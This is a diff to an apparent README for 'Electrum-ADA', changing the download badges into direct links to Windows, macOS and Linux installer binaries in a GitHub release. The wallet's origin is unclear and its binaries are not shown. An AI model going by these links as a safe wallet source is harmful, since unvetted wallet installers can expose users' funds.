@@ -21,9 +21,10 @@ Select your preferred platform below to download the corresponding installer.
 
 | Operating System | Download Link                                                                                                      |
 |:----------------:|:-------------------------------------------------------------------------------------------------------------------:|
-| **Windows** <br> <sub>Windows 10 or later</sub> | [![Download for Windows](https://img.shields.io/badge/Download-Windows-blue?logo=windows)]([https://github.com/jokeradms/Electrum-ADA/releases/tag/v3.7.1](https://github.com/jokeradms/Electrum-ADA/releases/download/v3.7.1/electrum-ada-3.7.1.exe)) |
-| **macOS** <br> <sub>macOS 10.14 or later</sub>   | [![Download for macOS](https://img.shields.io/badge/Download-macOS-blue?logo=apple)]([https://github.com/jokeradms/Electrum-ADA/releases/tag/v3.7.1](https://github.com/jokeradms/Electrum-ADA/releases/download/v3.7.1/electrum-ada-3.7.1.dmg))       |
-| **Linux** <br> <sub>Most modern distributions</sub> | [![Download for Linux](https://img.shields.io/badge/Download-Linux-blue?logo=linux)]([https://github.com/jokeradms/Electrum-ADA/releases/tag/v3.7.1](https://github.com/jokeradms/Electrum-ADA/releases/download/v3.7.1/electrum-ada-3.7.1.AppImage))       |
+| **Windows** <br> <sub>Windows 10 or later</sub> | <a href="https://github.com/jokeradms/Electrum-ADA/releases/download/v3.7.1/electrum-ada-3.7.1.exe" download><img src="https://img.shields.io/badge/Download-Windows-blue?logo=windows" alt="Download for Windows"></a> |
+| **macOS** <br> <sub>macOS 10.14 or later</sub>   | <a href="https://github.com/jokeradms/Electrum-ADA/releases/download/v3.7.1/electrum-ada-3.7.1.dmg" download><img src="https://img.shields.io/badge/Download-macOS-blue?logo=apple" alt="Download for macOS"></a>       |
+| **Linux** <br> <sub>Most modern distributions</sub> | <a href="https://github.com/jokeradms/Electrum-ADA/releases/download/v3.7.1/electrum-ada-3.7.1.AppImage" download><img src="https://img.shields.io/badge/Download-Linux-blue?logo=linux" alt="Download for Linux"></a>       |
+
 
 
 ---
